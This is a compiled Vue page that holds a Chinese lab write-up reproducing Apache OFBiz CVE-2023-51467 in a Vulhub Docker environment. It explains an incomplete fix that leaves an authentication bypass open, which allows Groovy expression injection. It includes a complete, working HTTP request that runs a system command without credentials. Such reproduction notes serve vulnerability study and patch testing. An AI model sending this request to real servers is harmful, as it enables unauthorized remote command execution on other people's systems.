import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as r,c,a as e,b as a,d as t,e as l}from"./app-58e4a7d6.js";const s={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Apache OFBiz 是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新 J2EE/XML 规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类 WEB 应用系统的框架。 OFBiz 最主要的特点是 OFBiz 提供了一整套的开发基于 Java 的 web 应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。",-1),h={href:"https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-49070",target:"_blank",rel:"noopener noreferrer"},u=e("p",null,"参考连接：",-1),m={href:"https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa",target:"_blank",rel:"noopener noreferrer"},b={href:"https://xz.aliyun.com/t/13211",target:"_blank",rel:"noopener noreferrer"},v={href:"https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/",target:"_blank",rel:"noopener noreferrer"},g=l(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Apache OfBiz 18.12.10 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在等待数分钟后，访问 <code>https://your-ip:8443/accounting</code> 查看到登录页面，说明环境已启动成功。</p><p>如果是非本地 localhost 启动，Headers 需要包含 <code>Host: localhost</code>，否则报错：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ERROR MESSAGE
org.apache.ofbiz.webapp.control.RequestHandlerException: Domain xx.xx.xx.xx not accepted to prevent host header injection. You need to set host-headers-allowed property in security.properties file.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240104105738488.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接发送如下请求即可使用 Groovy 脚本执行 <code>id</code> 命令：</p><blockquote><p>Host: localhost</p></blockquote><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/ProgramExport/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

groovyProgram=throw+new+Exception(&#39;id&#39;.execute().text);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240104105846768.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12);function f(_,x){const n=o("ExternalLinkIcon");return r(),c("div",null,[d,p,e("p",null,[a("这个漏洞的原因是对于 "),e("a",h,[a("CVE-2023-49070"),t(n)]),a(" 的不完全修复。在 Apache OFBiz 18.12.10 版本中，官方移除了可能导致 RCE 漏洞的 XMLRPC 组件，但没有修复权限绕过问题。来自长亭科技的安全研究员利用这一点找到了另一个可以导致 RCE 的方法：Groovy 表达式注入。")]),u,e("ul",null,[e("li",null,[e("a",m,[a("https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa"),t(n)])]),e("li",null,[e("a",b,[a("https://xz.aliyun.com/t/13211"),t(n)])]),e("li",null,[e("a",v,[a("https://y4tacker.github.io/"),t(n)])])]),g])}const A=i(s,[["render",f],["__file","Apache OfBiz 鉴权绕过导致命令执行 CVE-2023-51467.html.vue"]]);export{A as default};
